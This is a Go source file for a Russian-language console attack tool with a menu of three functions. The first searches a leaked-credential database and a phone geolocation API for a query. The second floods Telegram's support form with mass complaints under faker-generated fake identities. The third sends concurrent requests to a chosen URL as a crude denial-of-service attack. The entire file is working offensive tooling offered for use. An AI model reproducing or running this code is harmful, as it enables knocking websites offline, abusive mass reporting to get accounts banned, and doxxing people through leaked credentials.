package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/fatih/color"
	"github.com/jaswdr/faker/v2"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"
)

var red = color.New(color.FgRed)

type Region struct {
	Name  string `json:"name"`
	Okrug string `json:"okrug"`
}

type Country struct {
	Name string `json:"name"`
}

type Location struct {
	Country  Country `json:"country"`
	Region   Region  `json:"region"`
	Okrug    string  `json:"okrug"`
	Autocod  string  `json:"autocod"`
	TimeZone int     `json:"time_zone"`
	Limit    int     `json:"limit"`
}

func search(query string) string {
	url := "https://api.proxynova.com/comb?query=" + query + "&start=0&limit=100"
	res, err := http.Get(url)
	if err != nil {
		fmt.Println("Ошибка", err)
	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		fmt.Println("Ошибка", res.StatusCode)
	}
	dataProxynov, _ := ioutil.ReadAll(res.Body)
	url = "https://htmlweb.ru/geo/api.php?json&telcod=" + query
	res, err = http.Get(url)
	if err != nil {
		fmt.Println("Ошибка", err)
	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		fmt.Println("Ошибка", res.StatusCode)
	}
	dataHtmlweb, _ := ioutil.ReadAll(res.Body)
	var localtion Location
	err = json.Unmarshal([]byte(string(dataHtmlweb)), &localtion)
	if err != nil {
		fmt.Println(err)
	}
	resHtmlweb := map[string]interface{}{
		"country":  localtion.Country.Name,
		"region:":  localtion.Region.Name,
		"okrug":    localtion.Okrug,
		"timezone": strconv.Itoa(localtion.TimeZone),
	}
	resultHtmlWeb, err := json.MarshalIndent(resHtmlweb, "", "	")
	if err != nil {
		fmt.Println(err)
	}
	var data string = string(dataProxynov) + "\n" + string(resultHtmlWeb)
	return data

}

func websnos(text string, wg *sync.WaitGroup) {
	defer wg.Done()
	fake := faker.New()
	name := fake.Person().Name()
	number := fake.Phone().Number()
	email := fake.Internet().Email()
	data := []byte(`{
  "message":"` + text + `",
  "legal_name":'` + name + `',
  "email":'` + email + `',
  "phone":'` + number + `',
 }`)
	res, err := http.Post("https://telegram.org/support", "application/json", bytes.NewBuffer(data))
	if err != nil {
		fmt.Println(err)
	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		fmt.Println("Ошибка", res.StatusCode)
	}
	red.Println("Жалоба отправлена")
}

func dos(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	res, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		fmt.Println("Ошибка", res.StatusCode)
	}
	red.Println(res.StatusCode)
}

func main() {
	red.Println(`
	┌─┐    ┌─┐ ┌──┬─┬─┬┐ ┌──┬─┬─┬─┐
	│┌┼┬┬─┐├─├┬┼┐┌┤│││││ │─┬┤┼│┬┤┬┘
	│└┤┌┤┼└┤─┤│││││││││└┐│┌┘│┐┤┴┤┴┐
	└─┴┘└──┴─┼┐│└┘└─┴─┴─┘└┘ └┴┴─┴─┘
			 └─┘
		   	DEV: t.me/sharpovv
			CHANNEL: t.me/crazysofts_4
			[1] SEARCH
			[2] WEB-SNOS
			[3] DoS
			[4] SOURCE
			[5] INFO
			[6] EXIT
`)
	var choice string
	red.Print("Выберите -> ")
	fmt.Scan(&choice)
	switch choice {
	case "1":
		var query string
		red.Print("Введите запрос -> ")
		fmt.Scan(&query)
		res := search(query)
		red.Println(res)
		time.Sleep(time.Second * 3)
		main()
	case "2":
		var text string
		var request int
		red.Print("Введите текст -> ")
		fmt.Scan(&text)
		red.Print("Введите кол-во жалооб -> ")
		fmt.Scan(&request)
		wg := &sync.WaitGroup{}
		for i := 0; i < request; i++ {
			wg.Add(1)
			go websnos(text, wg)
		}
		wg.Wait()
		red.Println("Жалобы отправлены")
		time.Sleep(time.Second * 3)
		main()
	case "3":
		var url string
		var gor int
		wg := &sync.WaitGroup{}
		red.Print("Введите URL -> ")
		fmt.Scan(&url)
		red.Print("Введите кол-во запросов -> ")
		fmt.Scan(&gor)
		for i := 0; i < gor; i++ {
			wg.Add(1)
			go dos(url, wg)
		}
		wg.Wait()
		red.Println("Атака завершена")
		time.Sleep(time.Second * 3)
		main()
	case "4":
		red.Println("Исходный код доступен на: github.com/sharpovv/crazytool-free/")
	case "5":
		red.Println(`
Разработчик: @sharpovv
тгк: @crazysofts_4

Программа разработана на golang в качестве пет-проекта
Буду рад если вы подпишитесь на мой тгк :)`)
	case "6":
		red.Println("Пока...")
		os.Exit(0)
	}
}
